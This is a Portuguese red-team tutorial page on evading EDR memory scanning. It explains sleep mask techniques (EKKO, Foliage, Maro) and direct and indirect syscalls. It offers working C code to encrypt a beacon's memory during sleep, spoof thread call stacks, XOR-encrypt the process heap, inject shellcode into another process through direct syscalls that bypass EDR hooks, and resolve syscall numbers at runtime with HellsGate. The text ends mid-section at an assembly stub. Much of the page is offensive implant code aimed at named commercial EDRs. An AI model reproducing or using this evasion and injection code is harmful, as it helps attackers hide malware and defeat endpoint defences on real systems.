---
title: "Runtime Evasion & Sleepmask"
---

# Runtime Evasion e Sleep Mask

# O que é?

Sleep mask é uma técnica de proteção de beacons e implants C2 contra scanning de memória durante períodos de inatividade (sleep). A premissa fundamental é que EDRs modernos não dependem apenas de assinaturas estáticas analisadas em disco — eles realizam varreduras periódicas das regiões de memória de todos os processos em execução no sistema, procurando padrões característicos de shellcode, PE headers, e configurações de implants conhecidos.

O problema estrutural de beacons sem sleep mask: quando um implant dorme aguardando o próximo check-in com o servidor C2, seu código permanece em memória em páginas com permissão `PAGE_EXECUTE_READ` ou `PAGE_EXECUTE_READWRITE`, sem arquivo de backing em disco (memória privada anônima — `MEM_PRIVATE`). Esse padrão específico — regiões de memória executável privada, sem backing file em disco — é um indicador forte de código injetado e shellcode, detectável por scanners de memória como pe-sieve e BeaconEye.

Sleep mask resolve isso através de um ciclo criptográfico sincronizado com o período de sleep:

```
  Sem sleep mask (beacon detectável):

  Antes do sleep    Durante o sleep   Depois do sleep
  +-----------+     +-----------+     +-----------+
  | Código    |     | Código    |     | Código    |
  | Beacon    | --> | Beacon    | --> | Beacon    |
  | em RX     |     | em RX     |     | em RX     |
  | (visível) |     | (visível) |     | (visível) |
  +-----------+     +-----------+     +-----------+
                         ^
                    EDR scanner encontra
                    assinatura de Beacon aqui
```

```
  Com sleep mask (EKKO / implementação similar):

  Antes do sleep         Durante o sleep         Depois do sleep
  +-----------+     +-------------------+     +-----------+
  | Código    |     | Dados cifrados    |     | Código    |
  | Beacon    | --> | (aparência random)| --> | Beacon    |
  | em RX     |     | em RW (não-exec)  |     | em RX     |
  | (visível) |     | (não executável)  |     | (visível) |
  +-----------+     +-------------------+     +-----------+
              |         ^                 ^             |
    encrypt_self()      |                 |    decrypt_self()
    change_perms(RW)    |                 |    change_perms(RX)
                        |                 |
                   EDR scanner:      EDR scanner:
                   vê dados random    vê código Beacon
                   em página RW       mas beacon acordou
                   → não detecta      e agiu antes do scan
```

Implementações conhecidas e referenciadas em operações reais:
- **EKKO** — desenvolvido por Cracked5pider. Usa Windows Timer Queue + RC4 via SystemFunction032 + (em versões avançadas) ROP chains para garantir que o call stack durante a criptografia não mostre endereços suspeitos.
- **Foliage** — foca em call stack spoofing: altera o call stack da thread do beacon durante o sleep para que pareça uma thread legítima do sistema (ex: retornando para `ntdll!RtlUserThreadStart`).
- **Maro** — complementa EKKO com heap encryption: itera todos os blocos do heap do processo e aplica XOR com chave aleatória antes de dormir, protegendo dados de configuração e buffers armazenados no heap.
- **Cobalt Strike Arsenal Kit sleep mask** — implementação oficial da Fortra para Cobalt Strike, integrável via `stage { set sleep_mask "true"; }` no Malleable C2 profile.

---

# Onde é implementado?

Sleep mask é relevante em qualquer cenário de red team onde o endpoint alvo executa um EDR com capacidade de scanning de memória em runtime — o que engloba virtualmente todos os EDRs de nível enterprise atuais:

**C2 frameworks com suporte nativo ou via extensão:**

- **Cobalt Strike** (Fortra) — framework C2 mais amplamente deployado em operações red team profissionais. Sleep mask é implementada via Arsenal Kit: permite personalização completa da rotina de sleep do Beacon. O arquivo `sleepmask.c` do Arsenal Kit pode ser modificado e compilado como BOF para substituir o comportamento padrão. Suporte a EKKO, Foliage e implementações customizadas.
- **Havoc C2** — framework open source com sleep obfuscation nativo. Suporte a sleep mask com múltiplas técnicas de criptografia configuráveis.
- **Brute Ratel C4** (Pavan Karthick / Dark Vortex) — C2 comercial com sleep obfuscation, heap encryption e call stack spoofing integrados. Marketado especificamente para evasão de EDR.
- **Mythic** — framework C2 open source modular. Implementações de sleep mask disponíveis como agents (ex: Apollo agent com sleep mask), deployado em operações de red team governamentais e pentests.

**Contexto de call stack spoofing:**

Call stack spoofing é uma técnica relacionada que protege o thread do beacon não apenas durante o sleep cifrado, mas contra inspeção do call stack: EDRs como CrowdStrike e SentinelOne analisam o call stack de threads dormentes em busca de endereços de retorno que apontem para regiões de memória anônima (sem backing file), o que indica shellcode.

```
  Call stack de thread de Beacon SEM spoofing (suspeito):

  ntdll!NtWaitForSingleObject
  kernel32!WaitForSingleObjectEx
  0x1A2B3C4D5E6F   ← endereço em heap/private allocation
  0x1A2B3C4D1234   ← outro endereço suspeito

  EDR: return addresses em regiões sem backing file → shellcode detectado
```

```
  Call stack COM spoofing (Foliage/SilentMoonwalk):

  ntdll!NtWaitForSingleObject
  ntdll!RtlUserThreadStart
  kernel32!BaseThreadInitThunk

  EDR: stack parece thread legítima do sistema → não detectado
```

**Ambientes onde sleep mask é crítico:**

- Endpoints com CrowdStrike Falcon (Falcon Insight XDR) — realiza memory scanning ativo com análise de características de regiões de memória e call stacks de threads dormentes.
- Endpoints com SentinelOne Singularity — behavioral AI engine inclui scanning de memória em runtime para padrões de shellcode.
- Endpoints com Microsoft Defender for Endpoint (MDE) — memory scanning via Sense sensor e ETW-TI consumer.
- Endpoints com Carbon Black (VMware) — memory scanning via cb-defense sensor.

---

# Como funciona de forma adequada?

Para entender sleep mask, é necessário primeiro entender como o scanning de memória de EDRs funciona e por que beacons tradicionais são detectáveis. Depois, detalhar os mecanismos que sleep mask usa para se proteger — incluindo por que APC e Timer Queue são usados ao invés de Sleep simples, e por que call stack importa.

**Ciclo de vida completo de um beacon SEM sleep mask — perspectiva de detecção:**

```
  t=0s: Beacon acorda
        |
        +-> Executa tarefa (ex: net use, whoami)
        +-> Resultado enviado ao C2 via HTTP/S
        |
        +-> Sleep(60000)  ← dorme 60 segundos
            |
            | Durante esse período:
            | - Memória do Beacon: PAGE_EXECUTE_READ
            | - Tipo de memória: MEM_PRIVATE (sem backing file)
            | - Assinatura Beacon: visível (MZ header, config, strings)
            |
            | EDR realiza memory scan (ex: a cada 30s):
            |   VirtualQueryEx → enumera regiões
            |   ReadProcessMemory → lê conteúdo
            |   Compara com assinaturas → DETECTADO
            v
  t=60s: Beacon acorda mas foi detectado
```

**Como EKKO resolve o problema — mecanismo de Timer Queue + RC4:**

O desafio de sleep mask é: como criptografar a própria memória sem que o código de criptografia esteja visível ou seja chamado de forma suspeita? A solução do EKKO usa o Windows Timer Queue — timers executados por threads do thread pool do sistema:

```
  Beacon decide dormir por N segundos
        |
        v
  1. Criar hEvent (para sincronização)
  2. Criar hTimerQueue
        |
        +-> Timer 1 (delay=0ms):
        |     callback: VirtualProtect(BeaconBase, SIZE, PAGE_READWRITE)
        |     → Beacon vira não-executável
        |
        +-> Timer 2 (delay=100ms):
        |     callback: RC4_Encrypt(BeaconBase, SIZE, key)
        |     → Beacon vira dados aparentemente aleatórios
        |
        +-> Timer 3 (delay=200ms):
        |     callback: WaitForSingleObject(hEvent, N_milliseconds)
        |     → Thread do timer pool DORME por N ms
        |       (durante esse período: Beacon está cifrado + RW)
        |
        +-> Timer 4 (delay=200ms + N):
        |     callback: RC4_Decrypt(BeaconBase, SIZE, key)
        |     → Beacon é restaurado
        |
        +-> Timer 5 (delay=300ms + N):
        |     callback: VirtualProtect(BeaconBase, SIZE, PAGE_EXECUTE_READ)
        |     → Beacon vira executável novamente
        |
        +-> Timer 6 (delay=400ms + N):
              callback: SetEvent(hEvent_main)
              → acorda thread principal do Beacon
        |
  3. Thread principal: WaitForSingleObject(hEvent_main, INFINITE)
     ← bloqueia aqui esperando signal do Timer 6
```

**Por que usar APC e Timer Queue ao invés de Sleep() direto:**

```
  Problema com chamar VirtualProtect() diretamente de código Beacon:

  Call stack durante a chamada:
  ntdll!NtProtectVirtualMemory
  kernel32!VirtualProtect
  Beacon!SleepMask+0x1234   ← código em região privada anônima

  EDR: VirtualProtect chamado de endereço em MEM_PRIVATE → suspeito

  Solução com Timer Queue (ROP variant):
  Os callbacks do timer são executados por threads do thread pool
  do sistema (ntdll!TppWorkerThread). O call stack dos callbacks
  parece:

  ntdll!NtProtectVirtualMemory
  kernel32!VirtualProtect
  ntdll!TppTimerCallback          ← thread pool legítima
  ntdll!TppWorkerThread
  kernel32!BaseThreadInitThunk
  ntdll!RtlUserThreadStart

  EDR: VirtualProtect chamado de thread pool legítima → normal
```

**Por que call stack importa — análise de thread em sleep por EDR:**

```
  Thread do Beacon em sleep SEM call stack spoofing:

  Estado: WAIT (esperando em WaitForSingleObject)
  Call stack inspecionado pelo EDR:

  Frame 0: ntdll!NtWaitForSingleObject      ← legítimo
  Frame 1: kernel32!WaitForSingleObjectEx   ← legítimo
  Frame 2: 0x000001A2B3C40000               ← SUSPEITO
            └── VirtualQuery: MEM_PRIVATE, sem backing file
                → shellcode / código injetado
  Frame 3: 0x000001A2B3C40123               ← SUSPEITO

  EDR gera alerta: "Thread com return addresses em memória privada"
```

```
  Com Foliage / call stack spoofing:

  Mecanismo:
  1. Antes de dormir, salvar contexto da thread (RSP, RIP, registradores)
  2. Alocar "fake stack" no heap do processo host
  3. Preencher fake stack com return addresses legítimos:
     [frame N]   = ntdll!RtlUserThreadStart
     [frame N-1] = kernel32!BaseThreadInitThunk
  4. NtContinue com contexto modificado:
     RSP = ponteiro para fake stack
     RIP = ntdll!NtWaitForSingleObject
  5. Thread "continua" com stack que parece legítima
  6. Ao acordar: restaurar contexto original e retornar ao Beacon

  Estado durante sleep com spoofing:
  Frame 0: ntdll!NtWaitForSingleObject      ← legítimo
  Frame 1: ntdll!RtlUserThreadStart         ← legítimo (fake frame)
  Frame 2: kernel32!BaseThreadInitThunk     ← legítimo (fake frame)

  EDR: "Thread esperando normalmente" → não detectado
```

**Heap encryption (Maro) — por que o código não é o único alvo:**

```
  Regiões de memória de um beacon em runtime:

  +------------------------------+  ← BeaconBase
  | .text (código executável)    |  ← protegido pelo EKKO sleep mask
  | .data (dados estáticos)      |
  +------------------------------+  ← após EKKO: cifrado + RW

  +------------------------------+  ← Heap do processo
  | Buffer de configuração C2    |  ← contém: C2 server, sleep time,
  |   "https://cdn.example.com"  |    jitter, pipe name, etc.
  | Buffer de resposta HTTP      |
  | Dados de tarefa em execução  |  ← NÃO protegidos pelo EKKO padrão
  | Credenciais coletadas        |
  | Resultados de comandos       |
  +------------------------------+

  Scanner de memória pode extrair configuração de C2 do heap
  mesmo quando código está cifrado.

  Maro resolve: antes de EKKO sleep, itera todos os blocos
  do heap e aplica XOR com chave aleatória:

  HeapLock(hHeap)
  while HeapWalk(&entry):
    if entry.BUSY:
      XOR(entry.lpData, entry.cbData, key)
  HeapUnlock(hHeap)

  Depois: EKKO cifra o código.
  Durante sleep: código cifrado + heap cifrado = nada legível.
```

---

## Por Que Beacons em Sleep São Caçados

### Parte 1 — O Problema: Por Que Beacon Dorme de Forma Detectável

Quando um Beacon padrão está aguardando seu próximo check-in:

1. **Páginas RX em memória privada:** O shellcode do Beacon ocupa páginas de memória com `PAGE_EXECUTE_READ`. Memória executável privada (sem backing em arquivo no disco) é altamente suspeita para EDRs.

2. **Assinaturas no conteúdo:** O próprio código do Beacon contém padrões reconhecíveis — a configuração do implante (sleep time, jitter, C2 host), strings de user-agent, padrões de pipe nomeado para comunicação fork-and-run. Ferramentas como BeaconEye e pe-sieve escaneiam processos e identificam esses padrões.

3. **Padrões de thread:** A thread do Beacon, quando dormindo via `SleepEx()` ou `WaitForSingleObject()`, tem um call stack que termina em `Beacon!sleep()` → `WINAPI!SleepEx()`. EDRs podem inspecionar stacks de threads dormentes.

4. **Comportamento de I/O de rede:** Padrão de check-in periódico (mesmo com jitter) é detectável via análise de tráfego de rede ao longo do tempo.

**Sleep mask** endereça os pontos 1 e 2. Call stack spoofing endereça o ponto 3.

### Parte 2 — EKKO: Sleep Obfuscation via Timer + ROP Chain

EKKO é uma técnica de sleep mask desenvolvida por RtlMateusz (referência: repositório EKKO no GitHub). O mecanismo central usa **Windows Timers e APCs (Asynchronous Procedure Calls)** para executar uma cadeia de operações que:

1. Troca permissões do Beacon para RW (não-executável)
2. Criptografa o conteúdo do Beacon com RC4/XOR
3. Aguarda o tempo de sleep
4. Decriptografa o Beacon
5. Restaura permissões para RX
6. Retorna execução para o Beacon

**Por que usar ROP (Return-Oriented Programming)?**

Se usássemos chamadas diretas para `VirtualProtect()` e `SystemFunction032()` (RC4 da Windows) dentro de uma função C normal, o call stack durante a execução mostraria:

```
ntdll!ZwProtectVirtualMemory
kernel32!VirtualProtect
BeaconSleepMask!SomeSleepFunction  ← suspeito: código de região anônima chamando VirtualProtect
```

O EDR vê `VirtualProtect` sendo chamado de uma região de memória sem backing file e gera alerta. Com ROP, os "retorno" addresses na stack apontam para gadgets dentro de DLLs legítimas do sistema (ntdll.dll, kernel32.dll), então o call stack parece legítimo.

**Mecanismo EKKO passo a passo:**

```
┌─────────────────────────────────────────────────────┐
│  Beacon está acordado, prepara sleep                │
│                                                     │
│  1. Criar Event objeto (hEvent)                     │
│  2. Criar TimerQueue                                │
│  3. Enfileirar Timer 1 → callback: VirtualProtect   │
│     (Beacon→RW) em t=0ms                           │
│  4. Enfileirar Timer 2 → callback: RC4 Encrypt      │
│     Beacon em t=100ms                               │
│  5. Enfileirar Timer 3 → callback: WaitForSingle    │
│     Object(hEvent, sleepTime) em t=200ms            │
│  6. Enfileirar Timer 4 → callback: RC4 Decrypt      │
│     Beacon em t=300ms                               │
│  7. Enfileirar Timer 5 → callback: VirtualProtect   │
│     (Beacon→RX) em t=400ms                         │
│  8. Enfileirar Timer 6 → callback: SetEvent(hEvent) │
│     em t=500ms                                      │
│  9. WaitForSingleObject(hEvent, INFINITE)            │
│     ← Beacon bloqueia aqui esperando signal         │
└─────────────────────────────────────────────────────┘
```

Os timers executam via thread pool do sistema em threads separadas. A thread do Beacon está bloqueada em `WaitForSingleObject`. Durante o período de sleep (passo 5), o Beacon está criptografado e com páginas RW — invisível para scanners de memória.

**Implementação C do EKKO:**

```c
#include <windows.h>
#include <wincrypt.h>
#include <stdint.h>

// Prototype para SystemFunction032 (RC4 no advapi32)
typedef NTSTATUS (WINAPI* pSystemFunction032)(PUNICODE_STRING data, PUNICODE_STRING key);

// Estrutura para passar parâmetros para callbacks de timer
typedef struct _EKKO_PARAMS {
    PVOID  BeaconBase;      // Endereço base do Beacon em memória
    SIZE_T BeaconSize;      // Tamanho do Beacon
    HANDLE hEvent;          // Event para sincronização
    DWORD  SleepTime;       // Tempo de sleep em ms
    BYTE   Key[16];         // Chave RC4
} EKKO_PARAMS, *PEKKO_PARAMS;

// Callback: altera permissão de memória do Beacon
VOID CALLBACK TimerCallbackProtect(PVOID param, BOOLEAN timerOrWaitFired) {
    PEKKO_PARAMS p = (PEKKO_PARAMS)param;
    DWORD oldProtect;
    VirtualProtect(p->BeaconBase, p->BeaconSize, PAGE_READWRITE, &oldProtect);
}

// Callback: restaura permissão de execução
VOID CALLBACK TimerCallbackRestore(PVOID param, BOOLEAN timerOrWaitFired) {
    PEKKO_PARAMS p = (PEKKO_PARAMS)param;
    DWORD oldProtect;
    VirtualProtect(p->BeaconBase, p->BeaconSize, PAGE_EXECUTE_READ, &oldProtect);
}

// RC4 via SystemFunction032 (evita implementar RC4 manualmente)
VOID RC4EncryptBeacon(PVOID base, SIZE_T size, PBYTE key, DWORD keyLen) {
    pSystemFunction032 Sf032 = (pSystemFunction032)GetProcAddress(
        LoadLibraryA("advapi32"), "SystemFunction032");
    
    UNICODE_STRING data, keyStr;
    data.Buffer  = (PWSTR)base;
    data.Length  = (USHORT)size;
    data.MaximumLength = (USHORT)size;
    
    keyStr.Buffer  = (PWSTR)key;
    keyStr.Length  = (USHORT)keyLen;
    keyStr.MaximumLength = (USHORT)keyLen;
    
    Sf032(&data, &keyStr);  // RC4 é simétrico: encrypt = decrypt
}

// Callback: criptografa Beacon
VOID CALLBACK TimerCallbackEncrypt(PVOID param, BOOLEAN timerOrWaitFired) {
    PEKKO_PARAMS p = (PEKKO_PARAMS)param;
    RC4EncryptBeacon(p->BeaconBase, p->BeaconSize, p->Key, sizeof(p->Key));
}

// Callback: decriptografa Beacon
VOID CALLBACK TimerCallbackDecrypt(PVOID param, BOOLEAN timerOrWaitFired) {
    PEKKO_PARAMS p = (PEKKO_PARAMS)param;
    RC4EncryptBeacon(p->BeaconBase, p->BeaconSize, p->Key, sizeof(p->Key));
}

// Callback: sinaliza Event para acordar thread principal
VOID CALLBACK TimerCallbackSetEvent(PVOID param, BOOLEAN timerOrWaitFired) {
    PEKKO_PARAMS p = (PEKKO_PARAMS)param;
    SetEvent(p->hEvent);
}

// Função principal de sleep obfuscado
VOID EkkoSleep(DWORD sleepMs) {
    // Determinar base e tamanho do Beacon
    // Em implementação real: usar reflective loader para encontrar a região
    PVOID beaconBase = GetModuleHandleA(NULL);  // Simplificado
    SIZE_T beaconSize = 0x100000;               // Simplificado; usar VirtualQuery
    
    // Gerar chave aleatória para RC4
    BYTE key[16];
    BCryptGenRandom(NULL, key, sizeof(key), BCRYPT_USE_SYSTEM_PREFERRED_RNG);
    
    EKKO_PARAMS params = {
        .BeaconBase = beaconBase,
        .BeaconSize = beaconSize,
        .SleepTime  = sleepMs,
    };
    memcpy(params.Key, key, sizeof(key));
    params.hEvent = CreateEventA(NULL, FALSE, FALSE, NULL);
    
    HANDLE hTimerQueue = CreateTimerQueue();
    HANDLE hTimer;
    
    // Timer 1 (t=0ms): tornar Beacon não-executável
    CreateTimerQueueTimer(&hTimer, hTimerQueue,
        TimerCallbackProtect, &params, 0, 0, 0);
    
    // Timer 2 (t=100ms): criptografar Beacon
    CreateTimerQueueTimer(&hTimer, hTimerQueue,
        TimerCallbackEncrypt, &params, 100, 0, 0);
    
    // Timer 3 (t=200ms + sleepMs): decriptografar Beacon
    CreateTimerQueueTimer(&hTimer, hTimerQueue,
        TimerCallbackDecrypt, &params, 200 + sleepMs, 0, 0);
    
    // Timer 4 (t=300ms + sleepMs): restaurar execução
    CreateTimerQueueTimer(&hTimer, hTimerQueue,
        TimerCallbackRestore, &params, 300 + sleepMs, 0, 0);
    
    // Timer 5 (t=400ms + sleepMs): sinalizar acordar
    CreateTimerQueueTimer(&hTimer, hTimerQueue,
        TimerCallbackSetEvent, &params, 400 + sleepMs, 0, 0);
    
    // Beacon bloqueia aqui — durante sleep está criptografado e não-executável
    WaitForSingleObject(params.hEvent, INFINITE);
    
    // Limpeza
    DeleteTimerQueue(hTimerQueue);
    CloseHandle(params.hEvent);
}
```

**Nota importante:** A implementação acima é simplificada para clareza didática. Uma implementação de produção usando EKKO corretamente usa ROP chains com gadgets de ntdll para evitar que o call stack durante os callbacks mostre código de região suspeita.

### Parte 3 — Foliage: Call Stack Spoofing

Mesmo com EKKO ativo, há um período de microsegundos entre o timer disparar e a criptografia ocorrer. Além disso, EDRs modernos podem inspecionar o call stack da thread principal do Beacon enquanto ela está bloqueada em `WaitForSingleObject`.

**O problema:** A thread do Beacon em sleep tem um call stack como:

```
ntdll!NtWaitForSingleObject
kernel32!WaitForSingleObjectEx
BeaconMalloc!EkkoSleep+0x123      ← endereço em região anônima executável
BeaconMalloc!BeaconMain+0x456     ← idem
```

O EDR identifica que a thread está esperando com return addresses em regiões de memória sem backing file — indício de código shellcode.

**Foliage** (e técnicas similares como Unwinder, SilentMoonwalk) modificam o call stack da thread durante o sleep para parecer uma thread legítima do sistema.

**Mecanismo:**

1. Antes de dormir, Foliage salva o contexto atual da thread (RSP, RIP, registradores)
2. Cria uma **stack falsa** em memória com return addresses que apontam para funções legítimas do sistema (ex: `ntdll!RtlUserThreadStart` → `kernel32!BaseThreadInitThunk` → `svchost!SvcMain`)
3. Usa `NtContinue` para fazer a thread continuar execução com o contexto modificado — especificamente RSP apontando para a stack falsa
4. A thread "continua" de `NtWaitForSingleObject` com stack que parece legítima
5. Ao acordar, restaura o contexto original

**Implementação conceitual em C:**

```c
#include <windows.h>
#include <winternl.h>

// NtContinue — não declarado no SDK padrão
typedef NTSTATUS (NTAPI* pNtContinue)(PCONTEXT ctx, BOOLEAN testAlert);

// Estrutura de frame de stack falso
typedef struct _FAKE_FRAME {
    PVOID ReturnAddress;
    PVOID Param1;
    PVOID Param2;
    PVOID Param3;
    PVOID Param4;
} FAKE_FRAME;

// Criar stack falsa que parece thread legítima esperando
// Faz call stack parecer: NtWaitForSingleObject ← ntdll!RtlUserThreadStart
BOOL SetupFakeCallStack(PCONTEXT ctx, HANDLE hWaitObject, DWORD timeout) {
    // Alocar memória para stack falsa (não pode ser em região suspeita)
    // Usar heap do processo host
    PVOID fakeStack = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 0x8000);
    if (!fakeStack) return FALSE;
    
    // Encontrar gadget legítimo em ntdll: endereço de retorno após NtWaitForSingleObject
    // em contexto de RtlUserThreadStart
    PVOID ntdll = GetModuleHandleA("ntdll.dll");
    PVOID rtlThreadStart = GetProcAddress(ntdll, "RtlUserThreadStart");
    PVOID ntWaitForSingle = GetProcAddress(ntdll, "NtWaitForSingleObject");
    
    // Configurar frames na stack falsa
    // (simplificado — implementação real requer análise de gadgets específicos)
    PVOID stackTop = (PVOID)((ULONG_PTR)fakeStack + 0x7000);
    
    // Frame que "retorna" para RtlUserThreadStart
    FAKE_FRAME* frame = (FAKE_FRAME*)stackTop - 1;
    frame->ReturnAddress = rtlThreadStart;
    
    // Modificar contexto: RSP aponta para stack falsa
    ctx->Rsp = (ULONG64)frame;
    ctx->Rip = (ULONG64)ntWaitForSingle;
    
    // Parâmetros para NtWaitForSingleObject via registradores
    ctx->Rcx = (ULONG64)hWaitObject;
    ctx->Rdx = FALSE;  // Alertable
    ctx->R8  = (ULONG64)&timeout;  // Timeout
    
    return TRUE;
}
```

**Nota:** Implementações reais de call stack spoofing (como a do repositório Cobalt-Strike-BOF-Collections ou Unwinder) são significativamente mais complexas, requerendo análise de frames legítimos de DLLs do sistema e manipulação cuidadosa de exception handlers (SEH/VEH) para evitar crashes.

### Parte 4 — Maro: Heap Encryption

EKKO protege a região `.text` do Beacon (código executável). Mas o Beacon aloca dados em heap durante execução — buffers de rede, strings de configuração, dados de tarefas, credenciais coletadas. Esses dados ficam no heap do processo e são acessíveis a scanners de memória mesmo quando o código está criptografado.

**Maro** complementa EKKO encriptando o heap durante sleep.

**Mecanismo:**

```c
#include <windows.h>

// Estrutura de bloco de heap (PROCESS_HEAP_ENTRY)
// HeapWalk itera todos os blocos alocados no heap

VOID MaroEncryptHeap(HANDLE hHeap, PBYTE xorKey, DWORD keyLen) {
    PROCESS_HEAP_ENTRY entry = { 0 };
    
    // Travar heap para operação segura
    HeapLock(hHeap);
    
    while (HeapWalk(hHeap, &entry)) {
        // Apenas blocos alocados (não livres)
        if (entry.wFlags & PROCESS_HEAP_ENTRY_BUSY) {
            PBYTE block = (PBYTE)entry.lpData;
            SIZE_T blockSize = entry.cbData;
            
            // XOR cada byte do bloco com a chave (rolling XOR)
            for (SIZE_T i = 0; i < blockSize; i++) {
                block[i] ^= xorKey[i % keyLen];
            }
        }
    }
    
    HeapUnlock(hHeap);
}

// Uso em conjunto com EKKO:
VOID ObfuscatedSleep(DWORD sleepMs) {
    BYTE xorKey[32];
    BCryptGenRandom(NULL, xorKey, sizeof(xorKey), BCRYPT_USE_SYSTEM_PREFERRED_RNG);
    
    HANDLE hHeap = GetProcessHeap();
    
    // 1. Criptografar heap
    MaroEncryptHeap(hHeap, xorKey, sizeof(xorKey));
    
    // 2. EKKO sleep (criptografa código + troca permissões)
    EkkoSleep(sleepMs);
    
    // 3. Decriptografar heap (mesma key = XOR reverso)
    MaroEncryptHeap(hHeap, xorKey, sizeof(xorKey));
}
```

**Consideração importante:** Criptografar o heap pode causar crashes se houver ponteiros internos do heap que apontem para dados dentro do próprio heap (linked lists, vtables, etc.). Implementações robustas precisam identificar e pular blocos que contenham ponteiros críticos para o runtime do heap. Maro real usa heurísticas para isso.

### Parte 5 — Direct e Indirect Syscalls

#### Por que Hooks de Userland São um Problema

EDRs injetam uma DLL em todos os processos (ex: `CrowdStrike_Falcon.dll`, `SentinelOne_UserSpace.dll`). Essa DLL **hooking** modifica os primeiros bytes de funções sensíveis em `ntdll.dll` — especificamente as funções que fazem a transição para kernel (NtAllocateVirtualMemory, NtWriteVirtualMemory, NtCreateThread, NtProtectVirtualMemory, etc.).

Em vez do código original (que executaria `syscall` diretamente), esses hooks redirecionam para a DLL do EDR, que analisa os parâmetros antes de passar para o kernel.

**Função original em ntdll (não hookada):**
```asm
NtAllocateVirtualMemory:
    mov r10, rcx
    mov eax, 0x18        ; SSN (System Service Number)
    syscall
    ret
```

**Função hookada pelo EDR:**
```asm
NtAllocateVirtualMemory:
    jmp qword ptr [0x7FFE0800]  ; salto para hook do EDR
    ; ... código original restante (nunca alcançado)
```

#### SSN — System Service Number

Cada syscall tem um número inteiro (SSN) que identifica qual função do kernel chamar. O kernel usa esse número como índice na SSDT (System Service Descriptor Table). O SSN muda entre versões do Windows (ex: NtAllocateVirtualMemory pode ser SSN 0x18 no Windows 10 21H2 mas 0x17 no Windows 11 22H2).

#### SysWhispers2 — SSNs Hardcoded

SysWhispers2 (e SysWhispers3) é uma ferramenta que gera código C + Assembly com os SSNs hardcoded para versões específicas do Windows.

**Geração:**
```bash
# Gerar stubs para funções específicas
python3 SysWhispers2.py --preset common -o syscalls
# Gera: syscalls.h e syscalls.asm (para MSVC) ou syscalls-asm.s (para GCC)
```

**Stub gerado (Assembly x64 para MSVC):**
```asm
; NtAllocateVirtualMemory stub
NtAllocateVirtualMemory PROC
    mov r10, rcx
    mov eax, 18h        ; SSN hardcoded para versão específica do Windows
    syscall
    ret
NtAllocateVirtualMemory ENDP
```

**Header gerado:**
```c
// syscalls.h — declarações para uso no código C
EXTERN_C NTSTATUS NtAllocateVirtualMemory(
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
);

EXTERN_C NTSTATUS NtWriteVirtualMemory(
    HANDLE ProcessHandle,
    PVOID BaseAddress,
    PVOID Buffer,
    SIZE_T NumberOfBytesToWrite,
    PSIZE_T NumberOfBytesWritten
);

EXTERN_C NTSTATUS NtCreateThreadEx(
    PHANDLE ThreadHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    HANDLE ProcessHandle,
    PVOID StartRoutine,
    PVOID Argument,
    ULONG CreateFlags,
    SIZE_T ZeroBits,
    SIZE_T StackSize,
    SIZE_T MaximumStackSize,
    PPS_ATTRIBUTE_LIST AttributeList
);
```

**Uso no código de injeção:**
```c
#include "syscalls.h"

VOID InjectShellcode(HANDLE hProcess, PBYTE shellcode, SIZE_T shellcodeSize) {
    PVOID remoteBase = NULL;
    SIZE_T regionSize = shellcodeSize;
    
    // Usar syscall direto — bypassa hook do EDR em NtAllocateVirtualMemory
    NtAllocateVirtualMemory(hProcess, &remoteBase, 0, &regionSize,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    
    SIZE_T bytesWritten;
    NtWriteVirtualMemory(hProcess, remoteBase, shellcode, shellcodeSize, &bytesWritten);
    
    DWORD oldProtect;
    // NtProtectVirtualMemory também via syscall direto
    NtProtectVirtualMemory(hProcess, &remoteBase, &regionSize,
        PAGE_EXECUTE_READ, &oldProtect);
    
    HANDLE hThread;
    NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProcess,
        remoteBase, NULL, 0, 0, 0, 0, NULL);
}
```

**Limitação de direct syscalls:** O call stack retorna para código que não está em ntdll. EDRs mais sofisticados verificam se o endereço de retorno após `syscall` está dentro de ntdll.dll — se não estiver, é suspeito.

#### HellsGate — SSN Discovery em Runtime

HellsGate parseia ntdll.dll em memória durante execução para descobrir SSNs, sem hardcoding.

```c
#include <windows.h>
#include <winternl.h>

// Extrair SSN de função não-hookada em ntdll
DWORD ExtractSSN(PVOID funcAddress) {
    PBYTE bytes = (PBYTE)funcAddress;
    
    // Padrão de stub de syscall em x64:
    // 4C 8B D1    mov r10, rcx
    // B8 XX XX XX XX  mov eax, SSN
    // 0F 05       syscall
    // C3          ret
    
    // Verificar se começa com o padrão esperado (não hookado)
    if (bytes[0] == 0x4C && bytes[1] == 0x8B && bytes[2] == 0xD1 &&
        bytes[3] == 0xB8) {
        // Bytes 4-7 são o SSN em little-endian
        return *(DWORD*)(bytes + 4);
    }
    
    // Se hookado (começa com JMP), SSN não pode ser extraído diretamente
    return 0xFFFFFFFF;  // Indicar erro
}

// Encontrar função por nome em ntdll
PVOID GetNtdllFunction(const char* funcName) {
    PVOID ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) return NULL;
    
    // Parsear export table de ntdll
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)ntdll;
    PIMAGE_NT_HEADERS nt  = (PIMAGE_NT_HEADERS)((PBYTE)ntdll + dos->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY expDir = (PIMAGE_EXPORT_DIRECTORY)(
        (PBYTE)ntdll + nt->OptionalHeader.DataDirectory[0].VirtualAddress);
    
    PDWORD names    = (PDWORD)((PBYTE)ntdll + expDir->AddressOfNames);
    PDWORD funcs    = (PDWORD)((PBYTE)ntdll + expDir->AddressOfFunctions);
    PWORD  ordinals = (PWORD) ((PBYTE)ntdll + expDir->AddressOfNameOrdinals);
    
    for (DWORD i = 0; i < expDir->NumberOfNames; i++) {
        char* name = (char*)((PBYTE)ntdll + names[i]);
        if (strcmp(name, funcName) == 0) {
            DWORD rva = funcs[ordinals[i]];
            return (PVOID)((PBYTE)ntdll + rva);
        }
    }
    return NULL;
}

// HellsGate: obter SSN em runtime
DWORD HellsGate_GetSSN(const char* funcName) {
    PVOID func = GetNtdllFunction(funcName);
    if (!func) return 0xFFFFFFFF;
    return ExtractSSN(func);
}

// Uso:
// DWORD ssn = HellsGate_GetSSN("NtAllocateVirtualMemory");
// Em seguida, usar o SSN com um stub assembly que aceita SSN dinâmico
```

**Stub assembly para HellsGate (SSN dinâmico):**
```asm
; hellsgate_stub.asm
